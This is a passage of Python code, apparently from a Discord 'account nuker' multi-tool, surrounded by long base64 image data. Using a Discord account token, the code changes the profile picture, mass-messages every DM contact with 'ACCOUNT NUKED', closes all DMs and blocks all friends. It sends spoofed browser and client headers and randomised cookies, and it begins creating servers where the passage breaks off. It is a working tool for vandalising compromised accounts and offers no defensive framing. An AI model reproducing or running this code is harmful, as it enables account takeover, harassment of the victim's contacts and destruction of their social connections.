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"

        payload = {
            'avatar':url3
        }

        l = requests.patch('https://discord.com/api/v9/users/@me', headers=header, json=payload)

        print(Fore.YELLOW + "Changed Pfp!")

        url4 = 'https://discord.com/api/v9/users/@me/relationships'
        header = {
            "authority": "discord.com",
            "path": f"/api/v9/users/@me/relationships",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{tukan}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        massdms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header).json()
        for user in massdms:
          payload = {
            'content':'ACCOUNT NUKED BY ECLIPSE MULTI-TOOL'
          }
          l = requests.post(f"https://discord.com/api/v9/channels/{user['id']}/messages",headers=header, json=payload)
          if l.status_code == 200 or 204:
            print(f'Sent Dm to {user["id"]}')
          else:
            pass

        print('Dmed All Users')

        closedms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header).json()
        for user in closedms:
          a = requests.delete(f"https://discord.com/api/v9/channels/{user['id']}",headers=header)
          if a.status_code == 200 or 204:
            print(f'Closed Dms With {user["id"]}')
          else:
            pass

        print(Fore.YELLOW + 'Closed all dms')

        payload = {"type": 2}
        r = requests.get(url4, headers=header).json()

        for x in r:
            e = requests.put(f'https://discord.com/api/v9/users/@me/relationships/{x["id"]}', headers=header, json=payload)
            if e.status_code == 200 or 204:
                print(f"Successfully blocked {x['id']}")
            else:
                print(e)

        print(Fore.YELLOW + "Blocked all friends")


        url2 = 'https://discord.com/api/v9/guilds'

        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": f"/api/v9/guilds",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{tukan}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        ids = []

        def servercreate():
            image = "data:image/jpg;base64,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